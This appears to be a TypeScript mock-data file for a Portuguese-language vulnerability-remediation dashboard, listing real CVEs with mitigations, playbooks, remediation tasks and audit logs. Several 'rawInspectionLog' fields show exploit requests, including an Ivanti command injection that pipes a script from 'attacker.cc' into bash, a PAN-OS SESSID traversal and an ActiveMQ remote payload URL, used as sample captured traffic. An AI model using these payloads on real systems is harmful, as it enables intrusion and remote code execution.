export interface Vulnerability {
  id: string;
  cveId: string;
  title: string;
  component: string;
  cvss: number;
  cvssSeverity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  cvssVector: string;
  epssScore: number; // e.g. 97.4
  epssPercentile: number; // e.g. 99
  affectedCount: number;
  affectedType: string; // 'Hosts', 'Firewalls', 'Build Nodes', 'Servidores', 'Brokers', 'Instâncias'
  environment: 'PROD' | 'STAGING' | 'CORP' | 'MISTO';
  environmentCount: number;
  targetDescription: string;
  tags: string[]; // e.g. ['KEV', 'RCE', 'Internet Exp.']
  hasPatch: boolean;
  isZeroDay: boolean;
  isCisaKev: boolean;
  publishedDate: string;
  cwe: string;
  mitreAttack: string;
  exploitMechanism: string;
  packetCaptureId: string;
  rawInspectionLog: string;
  mitigationLayer1: {
    title: string;
    description: string;
    badge: string;
  };
  mitigationLayer2: {
    title: string;
    description: string;
    command: string;
  };
  hostTarget: {
    hostname: string;
    internalFqdn: string;
    ip: string;
    isNatGw: boolean;
    osRuntime: string;
    hardeningStatus: 'Falha' | 'Conforme';
    region: string;
  };
}

export interface PlaybookItem {
  id: string;
  code: string;
  name: string;
  targetEnv: string;
  trigger: string;
  statusText: string;
  statusType: 'running' | 'standby' | 'monitoring';
  progress?: number;
  successRate: number;
}

export interface RemediationCard {
  id: string;
  taskCode: string;
  cveOrRef: string;
  severityLabel: string;
  severityScore: number;
  badgeType: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'POLICY';
  title: string;
  summary: string;
  squad: 'Cloud Sec & DevOps' | 'Identity Sec' | 'Infra Core' | 'Pagamentos & Checkout';
  assignees: { name: string; avatarText: string }[];
  progressText: string;
  progressPercent: number;
  toolFooter: { name: string; actionLabel: string; actionType: 'logs' | 'details' | 'stream' | 'rescan' };
  column: 'executing' | 'blocked' | 'verifying';
  // Optional blocked specifics
  blockReason?: string;
  blockedDurationHours?: number;
  riskCompliance?: string;
  cabVotes?: string;
  // Optional verifying specifics
  engineType?: string;
  targetPod?: string;
  timeoutMinutes?: number;
  scanProgress?: number;
}

export const INITIAL_VULNERABILITIES: Vulnerability[] = [
  {
    id: 'vuln-1',
    cveId: 'CVE-2024-21887',
    title: 'Ivanti Connect Secure Command Injection',
    component: 'web-admin-api / RestHandler.py',
    cvss: 9.8,
    cvssSeverity: 'CRITICAL',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    epssScore: 97.4,
    epssPercentile: 99,
    affectedCount: 18,
    affectedType: 'Hosts',
    environment: 'PROD',
    environmentCount: 12,
    targetDescription: 'Edge Gateways VPN',
    tags: ['KEV', 'RCE', 'Internet Exp.'],
    hasPatch: true,
    isZeroDay: false,
    isCisaKev: true,
    publishedDate: '12 Jan 2024',
    cwe: 'CWE-78: OS Command Injection',
    mitreAttack: 'MITRE ATT&CK T1059.006',
    exploitMechanism: 'Falha no endpoint REST de administração permitindo que atacantes remotos sem autenticação executem comandos arbitrários no gateway appliance.',
    packetCaptureId: '#04899',
    rawInspectionLog: `POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection HTTP/1.1\nHost: 10.240.10.4\nContent-Type: application/json\n\n{"type": ";curl -s http://attacker.cc/payload.sh | bash;"}`,
    mitigationLayer1: {
      title: 'Patch Oficial Ivanti v22.3R1',
      description: 'Aplica pacote de correção do daemon web-admin com validação estrita de rotas REST.',
      badge: 'HOTFIX HOMOLOGADO',
    },
    mitigationLayer2: {
      title: 'Bloqueio Perimetral WAF',
      description: 'Restringe acesso ao sub-caminho /api/v1/totp/ via Cloudflare Ruleset emergencial.',
      command: 'cloudflare-cli ruleset deploy --policy=BLOCK_IVANTI_PATH_TRAVERSAL --zone=edge-vpn',
    },
    hostTarget: {
      hostname: 'vpn-edge-gw-01',
      internalFqdn: 'vpn-edge-gw-01.corp.internal',
      ip: '198.51.100.8',
      isNatGw: true,
      osRuntime: 'Ivanti OS 22.2R1',
      hardeningStatus: 'Falha',
      region: 'AWS us-east-1 (N. Virginia)',
    },
  },
  {
    id: 'vuln-2',
    cveId: 'CVE-2024-3400',
    title: 'Palo Alto GlobalProtect OS Command Injection',
    component: 'PAN-OS 10.2, 11.0, 11.1 / telemetry daemon',
    cvss: 10.0,
    cvssSeverity: 'CRITICAL',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:C',
    epssScore: 99.1,
    epssPercentile: 99,
    affectedCount: 6,
    affectedType: 'Firewalls',
    environment: 'PROD',
    environmentCount: 6,
    targetDescription: 'Bordas DC-SP & DC-VA',
    tags: ['KEV', 'Zero-Day', 'Root Exploit'],
    hasPatch: true,
    isZeroDay: true,
    isCisaKev: true,
    publishedDate: '12 Abr 2024',
    cwe: 'CWE-77: Command Injection',
    mitreAttack: 'MITRE ATT&CK T1059.004',
    exploitMechanism: 'A falha reside na ausência de sanitização dos valores fornecidos no cabeçalho SESSID durante a manipulação do relatório de integridade do host (HIP). O serviço interno de telemetria invoca um shell script de coleta sem validar o path traversal.\n\nO adversário encadeia a criação de um arquivo temporário no filesystem /opt/panlogs/tmp/device_telemetry/ com um comando bash injetado via pipeline, culminando na execução direta de código com privilégios de superusuário (root).',
    packetCaptureId: '#04921',
    rawInspectionLog: `... WAF_INGRESS_CAPTURE // RAW_INSPECTION     MATCH: SIGNATURE_PAN_RCE_01\n\n# HTTP Header Injection Request via Ingress Gateway Node\nPOST /ssl-vpn/hipreport.esp HTTP/1.1\nHost: 10.240.12.88\nUser-Agent: Mozilla/5.0 (Security-Scanner/Audit)\nContent-Type: application/x-www-form-urlencoded\nCookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/mic2.darknet/sh\nContent-Length: 0\n\n-------------------------------------------------------------\n# TELEMETRY DAEMON LOG ENTRY TRIGGERED:\n[CRITICAL_EXEC] execve("/bin/sh", ["/bin/sh", "-c", "cat /opt/panlogs/tmp/device_telemetry/..."], ...)\nRESULT: Arbitrary privilege escalation with uid=0(root) gid=0(root)`,
    mitigationLayer1: {
      title: 'Atualização de Firmware Gateway v11.1.2-h3',
      description: 'Aplica a substituição do binário do parser de arquivos temporários e fecha o canal de injeção direta no daemon HIP. Homologado pelo time de SecOps com zero regressão reportada.',
      badge: 'HOTFIX OFICIAL',
    },
    mitigationLayer2: {
      title: 'Workaround Imediato (~30s)',
      description: 'Desabilita temporariamente o módulo de telemetria HIP no Nginx Gateway para neutralizar a superfície de ataque remota sem derrubar as sessões ativas:',
      command: 'kubectl exec -it prod-k8s-ingress-01 -n edge -- sed -i "s/enable_telemetry=true/enable_telemetry=false/" /etc/nginx/conf.d/telemetry.conf && nginx -s reload',
    },
    hostTarget: {
      hostname: 'prod-k8s-ingress-01',
      internalFqdn: 'prod-k8s-ingress-01.corp.internal',
      ip: '10.240.12.88',
      isNatGw: true,
      osRuntime: 'Alpine 3.19 / Nginx Plus v1.25',
      hardeningStatus: 'Falha',
      region: 'AWS sa-east-1 (São Paulo)',
    },
  },
  {
    id: 'vuln-3',
    cveId: 'CVE-2024-3094',
    title: 'XZ Utils Backdoor Injection',
    component: 'liblzma.so.5.6.0 & 5.6.1 / OpenSSH hook',
    cvss: 10.0,
    cvssSeverity: 'CRITICAL',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    epssScore: 82.3,
    epssPercentile: 96,
    affectedCount: 32,
    affectedType: 'Build Nodes',
    environment: 'STAGING',
    environmentCount: 32,
    targetDescription: 'CI/CD Runners Deb 12',
    tags: ['Supply Chain', 'Auth Bypass', 'SSHD'],
    hasPatch: true,
    isZeroDay: false,
    isCisaKev: false,
    publishedDate: '29 Mar 2024',
    cwe: 'CWE-506: Embedded Malicious Code',
    mitreAttack: 'MITRE ATT&CK T1195.002',
    exploitMechanism: 'Código ofuscado injetado durante o processo de build do pacote upstream da liblzma que intercepta chamadas de autenticação do OpenSSH através da função RSA_public_decrypt.',
    packetCaptureId: '#04771',
    rawInspectionLog: `# SSH PRE-AUTH HOOK INTERCEPT:\nliblzma.so.5.6.0 -> _get_cpuid hook triggered\nPayload signature verified: 0xf839a1c... -> Hijacking sshd authentication matrix`,
    mitigationLayer1: {
      title: 'Downgrade Compulsório liblzma v5.4.5',
      description: 'Substituição das bibliotecas compartilhadas nos templates base de imagem Debian.',
      badge: 'ROLLBACK HOMOLOGADO',
    },
    mitigationLayer2: {
      title: 'Quarentena de Runners CI/CD',
      description: 'Termina pods de runner ativos e bloqueia puxada de imagens upstream não assinadas.',
      command: 'kubectl scale deployment/ci-runner-pool -n cicd --replicas=0 && ansible-playbook purge-xz.yml',
    },
    hostTarget: {
      hostname: 'runner-node-sp04',
      internalFqdn: 'runner-node-sp04.k8s.internal',
      ip: '10.240.88.19',
      isNatGw: false,
      osRuntime: 'Debian 12 / Docker 26.0',
      hardeningStatus: 'Falha',
      region: 'AWS sa-east-1 (São Paulo)',
    },
  },
  {
    id: 'vuln-4',
    cveId: 'CVE-2023-48795',
    title: 'Terrapin SSH Prefix Truncation',
    component: 'ChaCha20-Poly1305 / OpenSSH < 9.6',
    cvss: 7.5,
    cvssSeverity: 'HIGH',
    cvssVector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N',
    epssScore: 34.8,
    epssPercentile: 78,
    affectedCount: 142,
    affectedType: 'Servidores',
    environment: 'MISTO',
    environmentCount: 142,
    targetDescription: 'Clusters K8s & Bastion',
    tags: ['Protocol Flaw', 'MitM Required'],
    hasPatch: true,
    isZeroDay: false,
    isCisaKev: false,
    publishedDate: '18 Dez 2023',
    cwe: 'CWE-354: Improper Validation of Integrity Check',
    mitreAttack: 'MITRE ATT&CK T1557.001',
    exploitMechanism: 'Manipulação de números de sequência durante o handshake inicial do protocolo SSH quando negociados modos CBC ou ChaCha20-Poly1305.',
    packetCaptureId: '#03912',
    rawInspectionLog: `# SSH_MSG_KEXINIT sequence truncation attack\nHandshake Packet count mismatched: dropped extension negotiation without peer awareness.`,
    mitigationLayer1: {
      title: 'Atualização do OpenSSH v9.6p1 Strict KEX',
      description: 'Implementação de extensão strict key exchange no sshd_config central.',
      badge: 'PATCH EM HOMOLOGAÇÃO',
    },
    mitigationLayer2: {
      title: 'Desativação de Cifras ChaCha20 no Bastion',
      description: 'Limita algoritmos de chave para curve25519-sha256 e aes256-gcm.',
      command: 'ansible all -m lineinfile -a "path=/etc/ssh/sshd_config line=\'Ciphers aes256-gcm@openssh.com\'" && systemctl reload sshd',
    },
    hostTarget: {
      hostname: 'bastion-core-01',
      internalFqdn: 'bastion-core-01.sa-east-1.corp',
      ip: '10.240.2.14',
      isNatGw: false,
      osRuntime: 'Ubuntu 22.04 LTS / OpenSSH 8.9p1',
      hardeningStatus: 'Falha',
      region: 'AWS sa-east-1 (São Paulo)',
    },
  },
  {
    id: 'vuln-5',
    cveId: 'CVE-2023-46604',
    title: 'Apache ActiveMQ OpenWire Remote Code Exec',
    component: 'ClassPathXmlApplicationContext unmarshaller',
    cvss: 9.8,
    cvssSeverity: 'CRITICAL',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    epssScore: 95.6,
    epssPercentile: 98,
    affectedCount: 4,
    affectedType: 'Brokers',
    environment: 'PROD',
    environmentCount: 4,
    targetDescription: 'Mensageria Financeira',
    tags: ['KEV', 'Ransomware'],
    hasPatch: true,
    isZeroDay: false,
    isCisaKev: true,
    publishedDate: '27 Out 2023',
    cwe: 'CWE-502: Deserialization of Untrusted Data',
    mitreAttack: 'MITRE ATT&CK T1203',
    exploitMechanism: 'Desserialização insegura no protocolo OpenWire permitindo instanciar XML arbitrários do Spring context via porta 61616.',
    packetCaptureId: '#04102',
    rawInspectionLog: `TCP [10.240.40.11:61616] OPENWIRE PROTOCOL:\nExceptionResponse -> org.springframework.context.support.ClassPathXmlApplicationContext\nURL Payload: http://198.51.100.99/payment-malware.xml`,
    mitigationLayer1: {
      title: 'Upgrade ActiveMQ 5.18.3',
      description: 'Validação de pacotes de protocolo e desativação de unmarshalling arbitrário.',
      badge: 'APROVADO CAB',
    },
    mitigationLayer2: {
      title: 'Isolar Porta 61616 via Security Group',
      description: 'Permitir tráfego somente de microserviços de pagamento autenticados por mTLS.',
      command: 'aws ec2 revoke-security-group-ingress --group-id sg-089fa88 --protocol tcp --port 61616 --cidr 0.0.0.0/0',
    },
    hostTarget: {
      hostname: 'activemq-fin-prod01',
      internalFqdn: 'activemq-fin-prod01.bank.internal',
      ip: '10.240.40.11',
      isNatGw: false,
      osRuntime: 'Amazon Linux 2 / JVM 17',
      hardeningStatus: 'Falha',
      region: 'AWS sa-east-1 (São Paulo)',
    },
  },
  {
    id: 'vuln-6',
    cveId: 'CVE-2023-22527',
    title: 'Atlassian Confluence Server SSTI',
    component: '/template-custom/preview endpoint unauth',
    cvss: 9.1,
    cvssSeverity: 'CRITICAL',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    epssScore: 91.2,
    epssPercentile: 97,
    affectedCount: 2,
    affectedType: 'Instâncias',
    environment: 'CORP',
    environmentCount: 2,
    targetDescription: 'Wiki Interna & Docs',
    tags: ['KEV', 'SSTI', 'RCE'],
    hasPatch: true,
    isZeroDay: false,
    isCisaKev: true,
    publishedDate: '16 Jan 2024',
    cwe: 'CWE-1336: Improper Neutralization of Template Engine Expressions',
    mitreAttack: 'MITRE ATT&CK T1190',
    exploitMechanism: 'Injeção de templates OGNL em endpoints legado não autenticados do Confluence 8.0 a 8.5.',
    packetCaptureId: '#04221',
    rawInspectionLog: `POST /template-custom/preview HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nlabel=\\u0027+#request.get(\\u0027.KEY_velocity.struts2.context\\u0027)...`,
    mitigationLayer1: {
      title: 'Rollout Confluence 8.5.5 LTS',
      description: 'Sanitização obrigatória de parâmetros OGNL e desativação de preview templates.',
      badge: 'AGENDADO 02:00 UTC',
    },
    mitigationLayer2: {
      title: 'Bloqueio de Rota no Ingress',
      description: 'Adiciona deny block no Nginx para a URL /template-custom/*.',
      command: 'kubectl patch ingress wiki-ingress -n corp --type=json -p=\'[{"op":"add","path":"/spec/rules/0/http/paths/0","value":{"path":"/template-custom","pathType":"Prefix","backend":{"service":{"name":"blackhole","port":{"number":80}}}}}]\'',
    },
    hostTarget: {
      hostname: 'wiki-corp-app01',
      internalFqdn: 'wiki-corp-app01.corp.internal',
      ip: '10.240.18.5',
      isNatGw: false,
      osRuntime: 'RHEL 9.2 / Java 11',
      hardeningStatus: 'Falha',
      region: 'AWS sa-east-1 (São Paulo)',
    },
  },
];

export const PLAYBOOKS_DATA: PlaybookItem[] = [
  {
    id: 'pb-1',
    code: 'PB-KERNEL-AUTO-01',
    name: 'K8s Node Live Patcher',
    targetEnv: 'AWS EKS Cluster SP-01',
    trigger: 'Trivy Scan CVE Score >= 9.0',
    statusText: 'Draining Node 16/20',
    statusType: 'running',
    progress: 80,
    successRate: 98.2,
  },
  {
    id: 'pb-2',
    code: 'PB-IAM-REVOKE-AUTO',
    name: 'Dormant Key Quarantine',
    targetEnv: 'IAM Global Policy Engine',
    trigger: 'CloudTrail Inactivity > 90d',
    statusText: 'Standby (Próx. ciclo 14:00)',
    statusType: 'standby',
    progress: 100,
    successRate: 100.0,
  },
  {
    id: 'pb-3',
    code: 'PB-WAF-VIRTUAL-PATCH',
    name: 'Cloudflare Rule Synthesizer',
    targetEnv: 'Edge Edge-Inbound Gateways',
    trigger: 'Zero-day Exploit Signature Detection',
    statusText: 'Monitoramento Ativo',
    statusType: 'monitoring',
    progress: 94,
    successRate: 94.7,
  },
  {
    id: 'pb-4',
    code: 'PB-TLS-CIPHER-CONSOLIDATE',
    name: 'TLS 1.3 Strict Enforcer',
    targetEnv: 'API Gateways & Ingress',
    trigger: 'PCI-DSS Audit Mismatch',
    statusText: 'Homologado em Staging',
    statusType: 'standby',
    progress: 92,
    successRate: 99.1,
  },
];

export const REMEDIATION_CARDS: RemediationCard[] = [
  {
    id: 'rem-1',
    taskCode: 'SEC-4109',
    cveOrRef: 'CVE-2024-1086',
    severityLabel: 'CRITICAL · 9.8',
    severityScore: 9.8,
    badgeType: 'CRITICAL',
    title: 'Rollout de Patch Kernel Linux 6.1.72',
    summary: 'Mitigação de Use-After-Free em nf_tables permitindo elevação local de privilégios e bypass de containers.',
    squad: 'Cloud Sec & DevOps',
    assignees: [
      { name: 'Gabriel M.', avatarText: 'GM' },
      { name: 'Lucas P.', avatarText: 'LP' },
    ],
    progressText: 'PROGRESSO CLUSTER: 75% (15/20 NÓS)',
    progressPercent: 75,
    toolFooter: { name: 'Ansible #892', actionLabel: 'Ver Logs', actionType: 'logs' },
    column: 'executing',
  },
  {
    id: 'rem-2',
    taskCode: 'SEC-4112',
    cveOrRef: 'IAM-KEY-ROTATION',
    severityLabel: 'HIGH · 7.5',
    severityScore: 7.5,
    badgeType: 'HIGH',
    title: 'Rotação de Segredos AWS IAM & KMS',
    summary: 'Desprovisionamento de credenciais estáticas com idade superior a 90 dias em contas operacionais.',
    squad: 'Identity Sec',
    assignees: [
      { name: 'Ana L.', avatarText: 'AL' },
    ],
    progressText: 'PROGRESSO CHAVES: 40% (8/20 CONTAS)',
    progressPercent: 40,
    toolFooter: { name: 'AWS Lambda Runner', actionLabel: 'Detalhes', actionType: 'details' },
    column: 'executing',
  },
  {
    id: 'rem-3',
    taskCode: 'SEC-4115',
    cveOrRef: 'INGRESS-SECURITY',
    severityLabel: 'MEDIUM · 5.3',
    severityScore: 5.3,
    badgeType: 'MEDIUM',
    title: 'Atualização de Nginx Ingress Controller v1.9.5',
    summary: 'Mitigação de bypass de validação de anotações no Ingress NGINX em ambiente corporativo.',
    squad: 'Infra Core',
    assignees: [
      { name: 'Renato C.', avatarText: 'RC' },
    ],
    progressText: 'DEPLOYS K8S: 20% (1/5 CLUSTERS)',
    progressPercent: 20,
    toolFooter: { name: 'Helm Operator', actionLabel: 'Ver Logs', actionType: 'logs' },
    column: 'executing',
  },
  {
    id: 'rem-4',
    taskCode: 'SEC-3998',
    cveOrRef: 'POLICY-9 · CRÍTICA',
    severityLabel: 'GATEWAY BLOCK',
    severityScore: 9.0,
    badgeType: 'POLICY',
    title: 'Desativação de TLS 1.0/1.1 no API Gateway Legacy',
    summary: 'Restringir conexões para TLS 1.3 / AEAD e desabilitar suítes CBC para aderência PCI-DSS v4.0.',
    squad: 'Pagamentos & Checkout',
    assignees: [
      { name: 'Carlos D.', avatarText: 'CD' },
      { name: 'Juliana F.', avatarText: 'JF' },
    ],
    progressText: 'CAB APROVAÇÃO: Pendente (3/5 votos)',
    progressPercent: 60,
    toolFooter: { name: 'CAB Workflow', actionLabel: 'Solicitar Aprovação Emergencial', actionType: 'details' },
    column: 'blocked',
    blockReason: 'Aguardando conclusão dos testes de regressão de checkout do time de Pagamentos e validação de POS legados de adquirentes parceiras.',
    blockedDurationHours: 18,
    riskCompliance: 'PCI-DSS 4.0 Fail',
    cabVotes: 'Pendente (3/5 votos)',
  },
  {
    id: 'rem-5',
    taskCode: 'SEC-4091',
    cveOrRef: 'CVE-2023-5678',
    severityLabel: 'HIGH · 8.1',
    severityScore: 8.1,
    badgeType: 'HIGH',
    title: 'Atualização do OpenSSL 3.0.13 em Auth Service',
    summary: 'Deploy efetuado nos pods de autenticação. Pipeline concluída no cluster SP-PROD-01.',
    squad: 'Cloud Sec & DevOps',
    assignees: [
      { name: 'Felipe B.', avatarText: 'FB' },
    ],
    progressText: 'TIMEOUT: 45 MIN',
    progressPercent: 10,
    toolFooter: { name: 'DAST Engine', actionLabel: 'Forçar Re-scan Imediato', actionType: 'rescan' },
    column: 'verifying',
    engineType: 'DAST ENGINE: Fila #3 Aguardando Scan',
    targetPod: 'auth-svc-prod-8df99-kx',
    timeoutMinutes: 45,
  },
  {
    id: 'rem-6',
    taskCode: 'SEC-4120',
    cveOrRef: 'CORS-MISCONFIG',
    severityLabel: 'MEDIUM · 6.1',
    severityScore: 6.1,
    badgeType: 'MEDIUM',
    title: 'Sanitização de Headers CORS em GraphQL Endpoint',
    summary: "Remoção de wildcard '*' no header Access-Control-Allow-Origin na rota federada '/graphql/v2'.",
    squad: 'Infra Core',
    assignees: [
      { name: 'Mariana S.', avatarText: 'MS' },
    ],
    progressText: 'ESTIMATIVA: 12 MIN',
    progressPercent: 65,
    toolFooter: { name: 'Pen-test Automation', actionLabel: 'Live Stream', actionType: 'stream' },
    column: 'verifying',
    scanProgress: 65,
  },
];

export interface AuditLog {
  id: string;
  timestamp: string;
  actor: string;
  action: string;
  target: string;
  result: 'SUCCESS' | 'WARNING' | 'FAILED';
  hash: string;
}

export const AUDIT_LOGS_DATA: AuditLog[] = [
  {
    id: 'log-1',
    timestamp: 'Hoje, 17:58:12',
    actor: 'Dr. Gabriel Vasconcelos (Cmdr)',
    action: 'Bloqueio de IP de Origem Maliciosa (WAF Rule 4099)',
    target: 'fw-edge-sp01.corp (198.51.100.44)',
    result: 'SUCCESS',
    hash: 'SHA256: 4fa9...881c',
  },
  {
    id: 'log-2',
    timestamp: 'Hoje, 17:34:09',
    actor: 'SOAR Auto-Engine (PB-KERNEL-01)',
    action: 'Drenagem preventiva de nó worker K8s',
    target: 'k8s-prod-worker-08',
    result: 'SUCCESS',
    hash: 'SHA256: 91bb...402a',
  },
  {
    id: 'log-3',
    timestamp: 'Hoje, 16:45:00',
    actor: 'Ana L. (Identity Sec)',
    action: 'Revogação de Access Key IAM inativa (>90d)',
    target: 'AKIAIOSFODNN7EXAMPLE (deployer-auto)',
    result: 'SUCCESS',
    hash: 'SHA256: e3b0...c49a',
  },
  {
    id: 'log-4',
    timestamp: 'Hoje, 15:12:44',
    actor: 'Sistema de Detecção de Anomalias',
    action: 'Alerta Zero-Day gerado: CVE-2024-3400',
    target: 'prod-k8s-ingress-01',
    result: 'WARNING',
    hash: 'SHA256: 77a1...df90',
  },
  {
    id: 'log-5',
    timestamp: 'Hoje, 13:20:18',
    actor: 'CAB Emergency Workflow',
    action: 'Aprovação de Hotfix de Emergência requerida',
    target: 'API Gateway Legacy (TLS 1.0/1.1)',
    result: 'WARNING',
    hash: 'SHA256: 22c8...ef01',
  },
];
